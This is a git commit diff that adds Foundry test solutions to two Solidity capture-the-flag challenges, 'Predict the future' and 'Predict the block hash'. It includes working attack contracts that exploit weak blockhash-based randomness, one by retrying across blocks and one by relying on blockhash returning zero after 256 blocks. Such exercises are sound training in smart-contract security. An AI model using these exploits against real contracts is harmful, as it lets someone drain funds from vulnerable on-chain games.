dda95ae90e2ecc1f2e26a596e4550cf1bd37864b
islu <38793955+islu@users.noreply.github.com>
2024-04-26 15:56:14 +0800

    solve challenge (Lotteries - Predict the future)

--- test/1-Lotteries/5-PredictTheFuture.t.sol
+++ test/1-Lotteries/5-PredictTheFuture.t.sol
@@ -18,8 +18,53 @@ contract PredictTheFutureTest is Test {
 
         // [START]
 
+        // 1. Deploy attack contract
+        PredictTheFutureAttack attacker = new PredictTheFutureAttack(address(challenge));
+
+        vm.deal(address(attacker), 1 ether);
+
+        // 2. Lock in guess
+        attacker.lockInGuess{value: 1 ether}();
+
+        // 3. Settle
+        for (uint256 i = 0; i < 20; i++) {
+            vm.roll(block.number + 1); // advance to next block
+            try attacker.settle() {
+                console.log("Block number: ", vm.getBlockNumber());
+                break;
+            } catch {}
+        }
+
         // [END]
 
         assertTrue(challenge.isComplete());
     }
+}
+
+interface IPredictTheFuture {
+    function lockInGuess(uint8 n) external payable;
+    function settle() external;
+}
+
+// Attack contract
+contract PredictTheFutureAttack {
+    IPredictTheFuture target;
+    uint8 guess = 7;
+
+    constructor(address _target) public {
+        target = IPredictTheFuture(_target);
+    }
+
+    function lockInGuess() external payable {
+        target.lockInGuess{value: 1 ether}(guess);
+    }
+
+    function settle() external {
+        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
+        // console.log("answer: ", answer);
+        require(guess == answer, "Wrong answer");
+        target.settle();
+    }
+
+    receive() external payable {}
 }
--- test/1-Lotteries/6-PredictTheBlockHash.t.sol
+++ test/1-Lotteries/6-PredictTheBlockHash.t.sol
@@ -18,8 +18,51 @@ contract PredictTheBlockHashTest is Test {
 
         // [START]
 
+        // 1. Deploy attack contract
+        PredictTheBlockHashAttack attacker = new PredictTheBlockHashAttack(address(challenge));
+
+        vm.deal(address(attacker), 1 ether);
+
+        // 2. Lock in guess
+        attacker.lockInGuess{value: 1 ether}();
+
+        // 3. Settle
+        // 40s: Block Information https://ethereum.github.io/yellowpaper/paper.pdf
+        vm.roll(block.number + 258);
+        attacker.settle();
+
         // [END]
 
         assertTrue(challenge.isComplete());
     }
+}
+
+interface IPredictTheBlockHash {
+    function lockInGuess(bytes32 hash) external payable;
+    function settle() external;
+}
+
+// Attack contract
+contract PredictTheBlockHashAttack {
+    IPredictTheBlockHash target;
+    bytes32 guess = 0;
+    uint256 settlementBlockNumber;
+
+    constructor(address _target) public {
+        target = IPredictTheBlockHash(_target);
+    }
+
+    function lockInGuess() external payable {
+        settlementBlockNumber = block.number + 1;
+        target.lockInGuess{value: 1 ether}(guess);
+    }
+
+    function settle() external {
+        bytes32 answer = blockhash(settlementBlockNumber);
+        console.logBytes32(answer);
+        require(guess == answer, "Wrong answer");
+        target.settle();
+    }
+
+    receive() external payable {}
 }
